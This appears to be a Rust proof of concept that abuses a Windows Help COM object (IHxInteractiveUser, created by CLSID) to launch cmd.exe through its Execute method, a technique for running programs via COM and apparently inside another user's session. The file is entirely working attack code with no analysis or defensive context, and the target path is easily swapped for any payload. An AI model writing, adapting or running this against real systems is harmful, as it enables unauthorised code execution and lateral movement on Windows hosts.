#![allow(non_snake_case, non_camel_case_types)]

use core::ffi::c_void;
use windows::{
    core::{w, PCWSTR},
    Win32::System::Com::{
        CLSIDFromString, CoCreateInstance, 
        CoInitializeEx, CoUninitialize, 
        CLSCTX_ALL, COINIT_MULTITHREADED
    },
};

fn main() -> windows::core::Result<()> {
    unsafe {
        // Initializes the COM environment
        CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;

        let clsid = CLSIDFromString(w!("{8cec58e7-07a1-11d9-b15e-000d56bfe6ee}"))?;
        let interactive: IHxInteractiveUser = CoCreateInstance(&clsid, None, CLSCTX_ALL)?;

        // Execute Command
        interactive.Execute(w!("file:///C:/WINDOWS/System32/cmd.exe"));

        // Cleanup COM after operations complete
        CoUninitialize();
    }

    Ok(())
}

windows::core::imp::define_interface!(IHxInteractiveUser, IHxInteractiveUser_Vtbl, 0x8cec595b_07a1_11d9_b15e_000d56bfe6ee);
windows::core::imp::interface_hierarchy!(IHxInteractiveUser, windows::core::IUnknown);

#[repr(C)]
pub struct IHxInteractiveUser_Vtbl {
    pub base__: windows::core::IUnknown_Vtbl,
    pub Execute: unsafe fn(this: *mut c_void, pcUrl: PCWSTR),
}

impl IHxInteractiveUser {
    pub fn Execute(&self, pcUrl: PCWSTR) {
        unsafe { (windows::core::Interface::vtable(self).Execute)(windows::core::Interface::as_raw(self), pcUrl) }
    }
}

impl core::ops::Deref for IHxInteractiveUser {
    type Target = windows::core::IUnknown;
    fn deref(&self) -> &Self::Target {
        unsafe { core::mem::transmute(self) }
    }
}